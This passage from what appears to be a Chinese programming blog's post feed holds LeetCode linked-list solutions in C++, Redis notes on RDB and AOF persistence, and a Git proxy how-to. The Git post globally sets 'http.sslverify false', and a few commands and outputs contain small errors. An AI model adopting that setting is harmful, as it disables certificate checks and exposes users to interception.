<li><p>输出环形链表的入环点：<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/">https://leetcode-cn.com/problems/linked-list-cycle-ii/</a></p>
</li>
<li><p>输出链表中倒数第k个节点：<a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/">https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/</a></p>
</li>
<li><p>反转链表：<a href="https://leetcode-cn.com/problems/reverse-linked-list/">https://leetcode-cn.com/problems/reverse-linked-list/</a></p>
</li>
</ul>
<span id="more"></span>

<h3><span id="解题思路">解题思路</span></h3><h4><span id="判断链表是否有环">判断链表是否有环</span></h4><p>思路：快慢指针法。 慢指针每前进一步，快指针就前进两步。如果快慢指针能相遇，证明有环，反之无环。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">hasCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    ListNode *fast = head;</span><br><span class="line">    ListNode *slow = head;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="literal">NULL</span> &amp;&amp; fast-&gt;next != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        fast = fast-&gt;next-&gt;next;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (fast == slow) &#123; <span class="comment">// 如果快慢指针能相遇，说明有环。</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="输出环形链表的入环点">输出环形链表的入环点</span></h4><p>以下给出两种思路：</p>
<p><strong>方法一：</strong> 遍历一次链表，将遍历到的节点存储到哈希表，如果节点已经在哈希表中，说明有环，输出入环点。</p>
<p><strong>复杂度分析：</strong> 时间复杂度O(N),  空间复杂度O(N)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    std::unordered_map&lt;ListNode *, <span class="type">int</span>&gt; t; <span class="comment">// 用哈希表将遍历过节点保存下来</span></span><br><span class="line">    <span class="keyword">while</span>(head) &#123;</span><br><span class="line">        <span class="keyword">if</span> (t.<span class="built_in">find</span>(head) != t.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        t[head] = <span class="number">1</span>;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong> 快慢指针法。创建fast, slow两个指针指向链表头，令fast前进速度为slow的两倍。当快慢指针相遇时，再创建一个指针p指向链表头, 让p和slow等速前进，p和slow必定会相遇，且相遇点即为入环点。</p>
<p>数学证明参考：<a href="https://leetcode-cn.com/problems/linked-list-cycle-ii/solution/huan-xing-lian-biao-ii-by-leetcode-solution/">LeetCode官方题解</a></p>
<p><strong>复杂度分析：</strong> 时间复杂度O(N), 空间复杂度O(1)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">detectCycle</span><span class="params">(ListNode *head)</span> </span>&#123;</span><br><span class="line">    ListNode *fast, *slow;</span><br><span class="line">    fast = slow = head;</span><br><span class="line">    <span class="keyword">while</span>(fast) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fast-&gt;next == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// fast前进速度为slow两倍</span></span><br><span class="line">        fast = fast-&gt;next-&gt;next;</span><br><span class="line">        slow = slow-&gt;next;</span><br><span class="line">        <span class="comment">// 快慢指针相遇时，用一个指针p指向链表头，让p和slow同时前进，p和slow相遇点即为入环点，</span></span><br><span class="line">        <span class="keyword">if</span> (fast == slow) &#123;</span><br><span class="line">            ListNode *p = head;</span><br><span class="line">            <span class="keyword">while</span> (p != slow) &#123;</span><br><span class="line">                p = p-&gt;next;</span><br><span class="line">                slow = slow-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="输出链表中倒数第k个节点">输出链表中倒数第k个节点</span></h4><p>以下给出两种思路：</p>
<p><strong>方法一：</strong> 遍历两次单链表，第一次遍历求出链表长度记为len, 第二次遍历找到第len - k个节点并输出即可。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度 O(1)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	ListNode *cur = head;</span><br><span class="line">	<span class="keyword">while</span>(cur != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		++len;</span><br><span class="line">		cur = cur-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len - k; ++i) &#123;</span><br><span class="line">		head = head-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong> 双指针法，设指针p, q，初始时将p指向链表头节点，q指向第k+1个节点，然后让p, q指针等速前进，当q为NULL时， p即为所求。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度 O(1)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode *front = head;</span><br><span class="line">    ListNode *behind = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; k; ++i) &#123;</span><br><span class="line">    	front = front-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(front != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        front = front-&gt;next;</span><br><span class="line">        behind = behind-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> behind;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4><span id="反转链表">反转链表</span></h4><p>以下给出两种思路：</p>
<p><strong>方法一：</strong> 遍历原链表，依次对每个节点用头插法创建新链表并返回。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度O(N)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode *l = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span>(head) &#123;</span><br><span class="line">        <span class="comment">// 依次对每个节点用头插法创建新链表</span></span><br><span class="line">        ListNode *s = <span class="keyword">new</span> <span class="built_in">ListNode</span>(head-&gt;val, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            l = s;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s-&gt;next = l;</span><br><span class="line">            l = s;</span><br><span class="line">        &#125;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>方法二：</strong> 迭代法，遍历单链表，依次改变每个节点的next指向即可。注意next指向改变后，就无法访问下一个节点了，所以要在改next指针之前，用一个临时指针保存next指向的节点。</p>
<p><strong>复杂度分析：</strong> 时间复杂度 O(N), 空间复杂度O(1)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode* head)</span> </span>&#123;</span><br><span class="line">    ListNode *pre = <span class="literal">NULL</span>;</span><br><span class="line">    ListNode *cur = head;</span><br><span class="line">    <span class="keyword">for</span>( ; cur != <span class="literal">NULL</span> ; ) &#123;</span><br><span class="line">        ListNode *tmpNext = cur-&gt;next; <span class="comment">// 用临时指针暂存next指向的节点</span></span><br><span class="line">        cur-&gt;next = pre;</span><br><span class="line">        pre = cur;</span><br><span class="line">        cur = tmpNext;	<span class="comment">// 当前节点next值改变后，从临时指针恢复下一个需遍历的节点</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> pre;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>LeetCode</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(八)——RDB持久化</title>
    <url>/2021/0314194830.html</url>
    <content><![CDATA[<h2><span id="简介">简介</span></h2><p>Redis是基于内存的数据库，服务器进程退出后，内存中的数据会丢失。为了解决这个问题，Redis提供了RDB持久化机制，将内存中的数据保存到硬盘，从而避免数据意外丢失。</p>
<h2><span id="rdb持久化">RDB持久化</span></h2><p>RDB持久化将某个时间点上的数据库状态保存到一个RDB文件，这个RDB文件是一个经过压缩的二进制文件，Redis服务器可以通过读取RDB文件还原数据库状态。</p>
<span id="more"></span>

<p>RDB文件的生成路径和文件名通过配置文件指定，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># dbfilename指定RDB文件名</span><br><span class="line">dbfilename dump.rdb</span><br><span class="line"></span><br><span class="line"># dir表示工作目录, RDB文件会写入这个目录</span><br><span class="line">dir /var/redis/6379</span><br></pre></td></tr></table></figure>

<h3><span id="1-rdb文件如何创建">1. RDB文件如何创建</span></h3><p>RDB持久化既可以手动触发，也可以通过配置文件的选项定期触发。</p>
<h4><span id="11-save-bgsave命令">1.1 save, bgsave命令</span></h4><p>执行<code>save</code>, <code>bgsave</code>命令，可以手动生成RDB文件。两者的区别如下：</p>
<ul>
<li><code>save</code>命令会阻塞Redis服务器进程，直到RDB文件创建完毕；阻塞期间服务器无法处理任何请求。</li>
<li><code>bgsave</code>命令会fork一个子进程，由子进程负责创建RDB文件，父进程能够继续处理命令请求。</li>
</ul>
<p><strong>注：</strong><code>bgsave</code>命令执行期间，服务器会拒绝执行客户端的<code>save</code>, <code>bgsave</code>命令，原因是防止竞争条件。</p>
<p>创建RDB文件的实际动作通过<code>rdb.c/rdbSave</code>函数完成,3.0版本的实现细节如下:</p>
<ul>
<li><p>先创建临时文件<code>&quot;temp-%d.rdb&quot;</code>, 其中%d为当前进程id。</p>
</li>
<li><p>遍历所有数据库,将数据库状态写入到该临时文件, 写入完成后调用<code>fflush</code>, <code>fsync</code>确保数据被写入硬盘。</p>
</li>
<li><p>调用<code>rename</code>方法,原子性地覆盖旧的RDB文件，覆盖成功后，将<code>dirty</code>计数器清零并记录当前时间(即最后一次完成RDB持久化的时间)。</p>
</li>
</ul>
<h4><span id="12-定期触发">1.2 定期触发</span></h4><h5><span id="121-保存条件怎么设置">1.2.1 保存条件怎么设置</span></h5><p>在配置文件中更改<code>save &lt;seconds&gt; &lt;changes&gt;</code>选项，可以设置多个<strong>保存条件</strong>。只要其中某个保存条件被满足，服务器就执行<code>bgsave</code>命令。</p>
<p>官方给出的save选项的典型设置和意义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Save the DB on disk:</span><br><span class="line">#   save &lt;seconds&gt; &lt;changes&gt;</span><br><span class="line">#</span><br><span class="line">#   Will save the DB if both the given number of seconds and the given</span><br><span class="line">#   number of write operations against the DB occurred.</span><br><span class="line">#</span><br><span class="line">#   In the example below the behavior will be to save:</span><br><span class="line">#   after 900 sec (15 min) if at least 1 key changed</span><br><span class="line">#   after 300 sec (5 min) if at least 10 keys changed</span><br><span class="line">#   after 60 sec if at least 10000 keys changed</span><br><span class="line">#</span><br><span class="line">#   Note: you can disable saving completely by commenting out all &quot;save&quot; lines.</span><br><span class="line">#</span><br><span class="line">#   It is also possible to remove all the previously configured save</span><br><span class="line">#   points by adding a save directive with a single empty string argument</span><br><span class="line">#   like in the following example:</span><br><span class="line">#</span><br><span class="line">#   save &quot;&quot;</span><br><span class="line"></span><br><span class="line">save 900 1				# 如果900秒内至少1个键被修改，就执行bgsave命令</span><br><span class="line">save 300 10				# 300秒内至少10个键被修改，就执行bgsave命令</span><br><span class="line">save 60 10000			# 60秒内至少10000个键被修改，就执行bgsave命令</span><br></pre></td></tr></table></figure>

<p>可以看出，如果想关闭RDB功能，只需注释掉所有save选项后，再添加<code>save &quot;&quot;</code>即可</p>
<h5><span id="122-实现细节">1.2.2 实现细节</span></h5><p>Redis服务器状态通过redisServer结构表示，其中<code>saveparams</code>属性用于记录所有的保存条件，如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">saveparam</span> *<span class="title">saveparams</span>;</span> <span class="comment">// 一维数组, = &#123;&#123;900, 1&#125;, &#123;300, 10&#125;, &#123;60, 10000&#125;&#125;</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">saveparam</span> &#123;</span></span><br><span class="line">	<span class="type">time_t</span> seconds;	<span class="comment">// 秒数</span></span><br><span class="line">	<span class="type">int</span> changes;	<span class="comment">// 修改数</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>光有保存条件还不行，我们还需要知道<strong>上一次成功执行RDB持久化的时间</strong>，以及<strong>距离上一次成功执行RDB持久化，服务器对数据库总共做了多少次修改</strong>，这样才能和每个保存条件做比较，最终判断某个保存条件是否被满足。</p>
<p>因此，redisServer结构中新增<code>dirty</code>计数器和<code>lastsave</code>属性，如下：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> redisServer &#123;</span><br><span class="line">	<span class="built_in">long</span> <span class="built_in">long</span> dirty;	<span class="comment">// 计数器</span></span><br><span class="line">	time_t lastsave;	<span class="comment">// 上一次成功执行持久化的时间，格式是UNIX时间戳</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>dirty</code>计数器记录距离上一次成功执行RDB持久化，服务器对数据库一共做了多少次修改。</li>
<li><code>lastsave</code>属性记录上一次成功执行RDB持久化的时间，格式为UNIX时间戳。</li>
</ul>
<p>Redis服务器会周期性地检查保存条件是否满足, 源码实现可参考<code>redis.c/ServerCron</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// serverCron是Redis服务器的时间事件，周期性执行，默认周期为0.1s, 可以通过改配置选项hz修改这个默认周期</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">serverCron</span><span class="params">(<span class="keyword">struct</span> aeEventLoop *eventLoop, <span class="type">long</span> <span class="type">long</span> id, <span class="type">void</span> *clientData)</span> &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; server.saveparamslen; j++) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">saveparam</span> *<span class="title">sp</span> =</span> server.saveparams+j;</span><br><span class="line">        <span class="keyword">if</span> (server.dirty &gt;= sp-&gt;changes &amp;&amp;</span><br><span class="line">            server.unixtime-server.lastsave &gt; sp-&gt;seconds &amp;&amp;</span><br><span class="line">            (server.unixtime-server.lastbgsave_try &gt;</span><br><span class="line">            REDIS_BGSAVE_RETRY_DELAY ||</span><br><span class="line">            server.lastbgsave_status == REDIS_OK)) &#123;</span><br><span class="line">            rdbSaveBackground(server.rdb_filename); <span class="comment">// 某个保存条件满足，就执行BGSAVE命令</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3><span id="2-rdb文件如何加载">2. RDB文件如何加载</span></h3><p>Redis没有提供专门加载RDB文件的命令，只要Redis在启动时检测到了RDB文件的存在，就会自动加载RDB文件，加载RDB文件的动作由<code>rdb.c/rdbLoad</code>函数完成。</p>
<p><strong>注</strong>: 如果Redis开启了AOF持久化功能, 服务器会优先使用AOF文件而不是RDB文件还原数据库。</p>
<h3><span id="3-rdb文件结构和解析方法">3. RDB文件结构和解析方法</span></h3><p>能借助工具离线分析RDB文件即可, 掌握RDB文件结构是非必要的，只需了解：</p>
<ul>
<li>RDB文件是一个经过压缩的二进制文件，对于不同类型的键，会使用不同的方式去存储。</li>
<li>RDB文件不保存已过期的键，但是会保存键的过期时间。</li>
</ul>
<p>Redis官方提供了<code>redis-check-rdb</code>工具用于检测RDB文件。</p>
<p>举例，在某个空的redis数据库中新增5个key，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 每种类型键增加1个						    # 查询键的命令</span><br><span class="line">set key1 123								# get key1</span><br><span class="line">rpush list1 1 2 3							# lrange 0 -1</span><br><span class="line">hset hashtable1 k1 v1 k2 v2 k3 v3 			# hgetall hashtable1</span><br><span class="line">sadd set1 1 2 3								# smembers set1</span><br><span class="line">zadd zset1 1.0 m1 2.0 m2 3.0 m3				# zrange zset1 0 -1 withscores</span><br></pre></td></tr></table></figure>

<p>可以通过<code>ob -cx dump.rdb</code>命令解析这个RDB文件, 但输出结果不够直观；更好的方式是借助开源社区已有的RDB分析工具, 可以参考：<a href="https://github.com/sripathikrishnan/redis-rdb-tools">https://github.com/sripathikrishnan/redis-rdb-tools</a></p>
<p>这里将RDB文件转换为json格式查看，命令如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># rdb -c json /var/redis/6379/dump.rdb</span><br><span class="line">[&#123;</span><br><span class="line">&quot;set1&quot;:[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;],</span><br><span class="line">&quot;zset1&quot;:&#123;&quot;m1&quot;:&quot;1&quot;,&quot;m2&quot;:&quot;2&quot;,&quot;m3&quot;:&quot;3&quot;&#125;,</span><br><span class="line">&quot;hashtable1&quot;:&#123;&quot;k1&quot;:&quot;v1&quot;,&quot;k2&quot;:&quot;v2&quot;,&quot;k3&quot;:&quot;v3&quot;&#125;,</span><br><span class="line">&quot;list1&quot;:[&quot;1&quot;,&quot;2&quot;,&quot;3&quot;],</span><br><span class="line">&quot;str1&quot;:&quot;123&quot;&#125;]</span><br></pre></td></tr></table></figure>

<h2><span id="参考资料">参考资料</span></h2><p>【1】《Redis设计与实现》  第10章 RDB持久化</p>
<p>【2】<a href="https://cloud.tencent.com/developer/article/1394329">Redis RDB文件离线分析</a></p>
]]></content>
      <categories>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>配置Git代理，解决下载龟速问题</title>
    <url>/2021/0605195418.html</url>
    <content><![CDATA[<h3><span id="背景">背景</span></h3><p>git clone龟速或出错，需要配置代理。</p>
<h3><span id="方法">方法</span></h3><p>首先，你的本地机器必须有socks5代理</p>
<p>进<code>git bash</code>，敲如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global http.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global https.proxy &#x27;socks5://127.0.0.1:1080&#x27;</span><br><span class="line">git config --global http.sslverify false</span><br><span class="line">git config -l</span><br></pre></td></tr></table></figure>
<span id="more"></span>

<h4><span id="典型问题">典型问题</span></h4><p>git clone报错: fatal: unable to access XXX.git: OpenSSL SSL_connect: SSL_ERROR_SYSCALL in connection to github.com:443</p>
<h4><span id="解决方法">解决方法</span></h4><p>StackOverFlow上能搜到同样问题，参考：<a href="https://stackoverflow.com/questions/49345357/fatal-unable-to-access-https-github-com-xxx-openssl-ssl-connect-ssl-error">https://stackoverflow.com/questions/49345357/fatal-unable-to-access-https-github-com-xxx-openssl-ssl-connect-ssl-error</a></p>
<p>进<code>git bash</code>，敲如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global --add remote.origin.proxy &quot;127.0.0.1:1087&quot;</span><br></pre></td></tr></table></figure>

<p>其中1087为http端口，打开你的ss软件，在设置中查看端口号即可：<br><img data-src="/2021/0605195418/image1.png"></p>
]]></content>
      <categories>
        <category>Git</category>
      </categories>
      <tags>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis学习笔记(九)——AOF持久化</title>
    <url>/2021/0320195112.html</url>
    <content><![CDATA[<h3><span id="简介">简介</span></h3><p>Redis提供了AOF(append only file)持久化功能，通过保存服务器执行的写命令的方式记录数据库状态。本文介绍如下内容：</p>
<ul>
<li>AOF持久化的实现 (命令追加、文件写入、AOF重写、AOF后台重写)</li>
<li>如何通过AOF文件还原数据库</li>
<li>AOF持久化的配置选项</li>
<li>AOF和RDB两种持久化方式的比较</li>
</ul>
<span id="more"></span>

<h3><span id="aof持久化的实现">AOF持久化的实现</span></h3><p>以下介绍AOF持久化的实现方式，内容分别如下：</p>
<ul>
<li><p>命令追加</p>
</li>
<li><p>文件写入和同步 </p>
</li>
<li><p>AOF重写</p>
</li>
<li><p>AOF后台重写</p>
</li>
</ul>
<h4><span id="命令追加">命令追加</span></h4><p>AOF功能开启后，每当服务器执行完一条写命令，这条写命令就会以协议格式追加到服务器状态的aof_buf缓冲区中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">redisServer</span> &#123;</span></span><br><span class="line">	sds aof_buf;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>例如，客户端向服务端发送<code>set number 1</code>命令，服务器执行完SET后，会将如下协议内容追加到aof_buf缓冲区</p>
<p>*3\r\n$3\r\nset\r\n$6\r\n\number\r\n$1\r\n\1\r\n</p>
<p>其中，\r\n表示换行符，我们打开对应的AOF文件，可以看到文件末尾追加了如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$6</span><br><span class="line">number</span><br><span class="line">$1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h4><span id="文件写入和同步">文件写入和同步</span></h4><p><strong>问题：</strong> aof_buf缓冲区在内存中，它是在什么时间点，以何种策略被写入到AOF文件的？</p>
<p>Redis服务器是一个事件驱动的程序，主进程就是一个事件循环(参考aeMain函数)，负责处理两类事件：文件事件、时间事件。</p>
<p>服务器处理文件事件时可能会执行写命令，这使得相应的协议内容被追加到aof_buf缓冲区，<strong>因此服务器在结束一个事件循环前，会调用flushAppendOnlyFile函数，考虑是否将aof_buf缓冲区的内容写入到AOF文件。</strong></p>
<p>以Redis 6.0版本的源码为例，事件主循环aeMain的实现如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">aeMain</span><span class="params">(aeEventLoop *eventLoop)</span> &#123;</span><br><span class="line">    eventLoop-&gt;stop = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!eventLoop-&gt;stop) &#123; <span class="comment">// 事件主循环，处理文件事件、时间事件...</span></span><br><span class="line">    	<span class="comment">// AE_ALL_EVENTS: 文件事件、时间事件</span></span><br><span class="line">    	<span class="comment">// AE_CALL_BEFORE_SLEEP: 一次事件循环中，调用aeApiPoll之前执行的处理函数 (flushAppendOnlyFile)</span></span><br><span class="line">        aeProcessEvents(eventLoop, AE_ALL_EVENTS | AE_CALL_BEFORE_SLEEP | AE_CALL_AFTER_SLEEP);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>单次事件循环aeProcessEvents函数的实现如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 单次事件循环 aeProcessEvents</span><br><span class="line">int aeProcessEvents(aeEventLoop *eventLoop, int flags) &#123;</span><br><span class="line">	// ...</span><br><span class="line">	eventLoop-&gt;beforesleep(eventLoop);	    // beforesleep为函数指针，其指向的函数中会调用flushAppendOnlyFile方法！</span><br><span class="line">	numevents = aeApiPoll(eventLoop, tvp);	// 通过I/O多路复用接口(select/poll/epoll),获取所有就绪的文件事件。</span><br><span class="line">    // ... 处理文件事件 + 时间事件</span><br><span class="line">	return processed;	// 返回处理的事件总数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>flushAppendOnlyFile</code>函数的行为根据服务器的配置选项<code>appendfsync</code>决定，该选项有三种取值，每种值对应的行为如下：</p>
<table>
<thead>
<tr>
<th align="left">appendfsync选项的取值</th>
<th align="left">flushAppendOnlyFile函数的行为</th>
<th align="left">安全性</th>
</tr>
</thead>
<tbody><tr>
<td align="left">always</td>
<td align="left">总是将aof_buf缓冲区内容写入并同步到AOF文件</td>
<td align="left">最高，只丢失一个事件循环中的数据</td>
</tr>
<tr>
<td align="left">everysec</td>
<td align="left">如距离上次同步AOF文件时间超过1秒，才对AOF文件进行同步操作，注意该同步操作通过一个线程专门负责执行</td>
<td align="left">会丢失约1秒种的数据</td>
</tr>
<tr>
<td align="left">no</td>
<td align="left">对AOF文件同步操作由操作系统自己决定</td>
<td align="left">最低，会丢失距离上次同步AOF文件之后的所有数据</td>
</tr>
</tbody></table>
<p>可以看出，<code>everysec</code>选项兼顾了性能和安全性，这也是官方推荐的默认选项。</p>
<p>注：<code>fsync</code>，<code>fdatasync</code>可以强制操作系统立即将内存缓冲区中数据写入磁盘。</p>
<h4><span id="aof重写">AOF重写</span></h4><p>随着服务器持续运行，执行的写命令会越来越多，导致AOF文件越来越大，影响性能。<strong>因此我们需要对AOF文件大小加以控制，在不改变数据库状态的前提下，压缩AOF文件体积</strong> —— 这就是Redis提供的AOF重写功能。</p>
<p>举例:</p>
<p>对一个列表键做如下写操作，为了保存这个列表键，AOF文件需记录3条命令，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis&gt; rpush list1 a b		# [a, b]</span><br><span class="line">redis&gt; rpop list1			# [b]</span><br><span class="line">redis&gt; rpush list1 c		# [b, c]</span><br></pre></td></tr></table></figure>

<p>如果想用更少的命令记录这个列表键，最简单的方法是直接读取这个列表键的值，用<code>rpush list1 b c</code>替代上面的3条命令。</p>
<p>通过这个例子可以看出AOF重写的实现要点：<strong>AOF重写通过读取服务器数据库状态来实现，而不是去分析现有的AOF文件！</strong> 源码实现参考<code>rewriteAppendOnlyFileBackground</code>函数。</p>
<h4><span id="aof后台重写">AOF后台重写</span></h4><p>AOF重写功能涉及大量写操作，Redis不希望AOF重写造成服务器无法处理请求，所以<strong>将AOF重写放到子进程里执行</strong>(这点和RDB持久化的BGSAVE思路类似)，这使得父进程不被阻塞，可以继续处理请求。这种处理方式会引入了一个问题：<strong>子进程执行AOF重写时，服务器会继续处理请求，可能会执行新的写命令，导致数据库状态发生变化，与AOF文件中的数据库状态不一致！</strong></p>
<p>为了解决这种数据不一致的问题，<strong>Redis设置了一个AOF重写缓冲区，在子进程进行AOF重写期间，服务器将客户端的写命令请求同时追加到AOF缓冲区和AOF重写缓冲区</strong>。</p>
<p>子进程完成AOF重写工作后，通知父进程将AOF重写缓冲区中的内容追加到新的AOF文件中，再原子性地覆盖旧的AOF文件，完成整个AOF后台重写。</p>
<p>源码实现参考<code>rewriteAppendOnlyFileBackground</code>函数和<code>backgroundRewriteDoneHandler</code>函数</p>
<h4><span id="如何通过aof文件还原数据库">如何通过AOF文件还原数据库</span></h4><p>创建一个无网络连接的伪客户端(fd值为-1)，从AOF文件中读出每条指令并执行，一直到AOF文件中所有的写命令执行完毕为止。源码实现参考<code>loadAppendOnlyFile</code>函数</p>
<h3><span id="aof配置选项">AOF配置选项</span></h3><p>常用配置选项如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">appendonly yes                      # 值为yes，表示开启AOF持久化功能。</span><br><span class="line">appendfilename &quot;appendonly.aof&quot;     # 指定aof文件名称</span><br><span class="line">appendfsync everysec                # 指定AOF文件的写入方式， everysec表示每秒同步一次</span><br></pre></td></tr></table></figure>

<h3><span id="aof和rdb比较">AOF和RDB比较</span></h3><p>RDB：文件相对较小，恢复较快，适合数据备份、灾难恢复。</p>
<p>AOF：文件相对较大，备份频率高(要设置fsync 策略), 适合故障恢复。</p>
<p>需针对不同业务场景选择合适的持久化方式：</p>
<ul>
<li><p>只用来做缓存 —— 可以关闭持久化功能。</p>
</li>
